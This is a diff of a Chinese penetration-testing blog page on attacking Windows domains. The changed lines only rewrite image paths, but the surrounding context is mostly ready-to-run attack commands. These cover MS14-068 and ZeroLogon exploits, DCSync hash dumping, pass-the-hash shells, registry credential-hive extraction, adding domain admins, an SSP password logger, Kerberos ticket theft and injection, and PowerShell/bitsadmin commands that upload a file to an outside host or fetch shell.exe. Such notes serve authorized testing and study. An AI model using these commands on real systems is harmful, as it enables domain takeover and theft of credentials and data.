@@ -11,23 +11,23 @@
 <meta property="og:site_name" content="h00ls">
 <meta property="og:description" content="内网渗透对内网渗透做了个总结，会持续更新、补充、修改…… 隧道、代理、端口转发代理与端口转发proxychains只支持TCP，不支持UDP和ICMP等 与nmap使用的时候，会出现问题。需要在配置文件中，注释掉proxy_dns windows端：https:&#x2F;&#x2F;github.com&#x2F;shunf4&#x2F;proxychains-windows.git proxifier适用windows Venomh">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210110155155661.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210110172341623.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131113629119.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131113844158.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131113948798.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131120225956.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131120402995.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131120434157.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210110181328115.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210116105039417.png">
-<meta property="og:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210116105528377.png">
+<meta property="og:image" content="http://example.com/images/image-20210110155155661.png">
+<meta property="og:image" content="http://example.com/images/image-20210110172341623.png">
+<meta property="og:image" content="http://example.com/images/image-20210131113629119.png">
+<meta property="og:image" content="http://example.com/images/image-20210131113844158.png">
+<meta property="og:image" content="http://example.com/images/image-20210131113948798.png">
+<meta property="og:image" content="http://example.com/images/image-20210131120225956.png">
+<meta property="og:image" content="http://example.com/images/image-20210131120402995.png">
+<meta property="og:image" content="http://example.com/images/image-20210131120434157.png">
+<meta property="og:image" content="http://example.com/images/image-20210110181328115.png">
+<meta property="og:image" content="http://example.com/images/image-20210116105039417.png">
+<meta property="og:image" content="http://example.com/images/image-20210116105528377.png">
 <meta property="article:published_time" content="2021-03-02T08:18:03.000Z">
-<meta property="article:modified_time" content="2021-03-02T08:20:06.141Z">
+<meta property="article:modified_time" content="2021-03-02T08:26:13.907Z">
 <meta property="article:author" content="h00ls">
 <meta property="article:tag" content="内网渗透专栏">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210110155155661.png">
+<meta name="twitter:image" content="http://example.com/images/image-20210110155155661.png">
 
     <link rel="alternate" type="application/atom+xml" href="/atom.xml">
     <link rel="icon" href="/images/favicon.png" type="image/x-icon">
@@ -329,9 +329,9 @@
 <p>ms14-068：<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;user   #获取sid</span><br><span class="line">ms14-068.exe -u [域用户]@[所在域] -s [域用户SID] -p [域用户密码] -d [域控地址]     #制作凭证</span><br><span class="line">kerberos::purge    #清除原有凭证</span><br><span class="line">mimikatz.exe &quot;kerberos::ptc c:[上面的凭证]&quot; exit   &#x2F;&#x2F;导入新的凭证</span><br></pre></td></tr></table></figure>
 <p>可以在<code>msf</code>中的<code>meterpreter</code>中直接使用</p>
-<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210110155155661.png" alt="image-20210110155155661"> </p>
+<p><img src="/images/image-20210110155155661.png" alt="image-20210110155155661"> </p>
 <p>使用psexec远程连接即可</p>
-<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210110172341623.png" alt="image-20210110172341623"></p>
+<p><img src="/images/image-20210110172341623.png" alt="image-20210110172341623"></p>
 <p>就可以直接添加域管理员</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user username password &#x2F;add &#x2F;domain</span><br><span class="line">net group &quot;Domain admins&quot; username &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>
 <h4 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h4><p> <strong>存在的意义：</strong>在比较大一点的环境中，我们会经常遇到这样的情况，由于电脑的批次不一样，或IT人员流动的问题，造成电脑的本地管理员密码不一致，当我们需要登录到本地管理员的时候，往往会不知道本地管理员密码，虽然我们可以通过进PE的办法破解密码，但如果电脑比较多，那么这将是一个讨厌的工作。如果是域环境，我们可以组策略的方式批量修改计算机的本地管理员密码。</p>
@@ -353,24 +353,24 @@
 </blockquote>
 <p>将域控密码设置为空</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &lt;域控机器名&gt; &lt;域控IP&gt;</span><br><span class="line"></span><br><span class="line">python3 cve-2020-1472-exploit.py WIN-03OO218S5B8 192.168.0.4</span><br></pre></td></tr></table></figure>
-<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131113629119.png" alt="image-20210131113629119"></p>
+<p><img src="/images/image-20210131113629119.png" alt="image-20210131113629119"></p>
 <p>通过 <code>Dcsync</code> 查看密码hash</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py &lt;域&gt;&#x2F;&lt;域控机器名&gt;\$@&lt;域控IP&gt; -just-dc -no-pass</span><br><span class="line"></span><br><span class="line">secretsdump.py king.com&#x2F;WIN-03OO218S5B8\$@192.168.0.4 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
-<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131113844158.png" alt="image-20210131113844158"></p>
+<p><img src="/images/image-20210131113844158.png" alt="image-20210131113844158"></p>
 <p>通过<code>wmiexec.py</code>获取shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py king.com&#x2F;administrator@&lt;域控IP&gt; -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 king.com&#x2F;administrator@192.168.0.4</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">wmiexec.py king.com&#x2F;administrator@&lt;域控IP&gt; -hashes aad3b435b51404eeaad3b435b51404ee:0d546438b1f4c396753b4fc8c8565d5b king.com&#x2F;administrator@192.168.0.4</span><br></pre></td></tr></table></figure>
-<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131113948798.png" alt="image-20210131113948798"></p>
+<p><img src="/images/image-20210131113948798.png" alt="image-20210131113948798"></p>
 <p><strong>恢复密码</strong></p>
 <p>工具：<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p>
 <p>在上面执行的cmd下执行如下命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># SHELL </span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.saveget security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
 <p>然后利用 <code>secretsdump</code> 解析保存在本地的NT hash</p>
-<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131120225956.png" alt="image-20210131120225956"></p>
+<p><img src="/images/image-20210131120225956.png" alt="image-20210131120225956"></p>
 <p>记录下上面获取的数据，接下来使用上面提到的工具恢复hash</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR &lt;ORI_HASH&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131120402995.png" alt="image-20210131120402995"></p>
+<p><img src="/images/image-20210131120402995.png" alt="image-20210131120402995"></p>
 <p>测试用空密码访问，已经失效了</p>
-<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131120434157.png" alt="image-20210131120434157"></p>
+<p><img src="/images/image-20210131120434157.png" alt="image-20210131120434157"></p>
 <h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h4><p> cobalt strike</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell setspn -T test.com -Q *&#x2F;*   探测域内存活的相关服务</span><br></pre></td></tr></table></figure>
 <p>导出票据</p>
@@ -410,7 +410,7 @@
 <p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html</a></p>
 <p><strong>利用</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将mimikatz下的mimilib.dll 拷贝到 C:\windows\system32的目录下</span><br><span class="line"></span><br><span class="line">添加Security Packages</span><br></pre></td></tr></table></figure>
-<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210110181328115.png" alt="image-20210110181328115"></p>
+<p><img src="/images/image-20210110181328115.png" alt="image-20210110181328115"></p>
 <p>重启成功，如果有用户成功登录到当前系统中,会在 c:\windows\system32 目录下生成一个用于记录登账账号密码的 kiwissp.log 文件</p>
 <h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>Golden Ticket是通过伪造的 TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p>
 <p><strong>条件</strong></p>
@@ -437,10 +437,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 导入工具</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process -Force</span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"># 查看非约束委派的用户</span><br><span class="line">Get-NetUser -Unconstrained -Domain king.com</span><br><span class="line"></span><br><span class="line"># 查看非约束委派的计算机</span><br><span class="line">Get-NetComputer -Unconstrained -Domain king.com</span><br><span class="line"></span><br><span class="line">把已经控制的主机用户设置为非约束委派，并且服务被其他主机访问的情况下才可继续利用</span><br></pre></td></tr></table></figure>
 <p>在域内主机上用本地管理员登录，执行一下命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 使用mimikatz导出主机中的所有凭证，找到如下的administrator的TGT凭证</span><br><span class="line">privilege::debug    </span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br></pre></td></tr></table></figure>
-<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210116105039417.png" alt="image-20210116105039417"></p>
+<p><img src="/images/image-20210116105039417.png" alt="image-20210116105039417"></p>
 <p>将凭证添注入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt xxx.kirbi</span><br></pre></td></tr></table></figure>
-<p><img src="C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210116105528377.png" alt="image-20210116105528377"></p>
+<p><img src="/images/image-20210116105528377.png" alt="image-20210116105528377"></p>
 <h4 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>非约束性委派（Unconstrained Delegation），服务账号可以获取某用户的TGT，<strong>从而服务账号可使用该TGT</strong>，模拟用户访问任意服务</p>
 <h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 文件上传</span><br><span class="line">powershell (New-Object System.Net.WebClient).UploadFile(&#39;http:&#x2F;&#x2F;10.11.0.4&#x2F;upload.php&#39;, &#39;important.docx&#39;)</span><br><span class="line"></span><br><span class="line"># 文件下载</span><br><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.111.1:8080&#x2F;test&#x2F;putty.exe&#39;,&#39;C:\Users\linghuchong\Desktop\Tools\putty1.exe&#39;)</span><br><span class="line">putty1.exe</span><br></pre></td></tr></table></figure>
 <h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;domain&#x2F;file c:\windows\temp\shell.exe</span><br></pre></td></tr></table></figure>
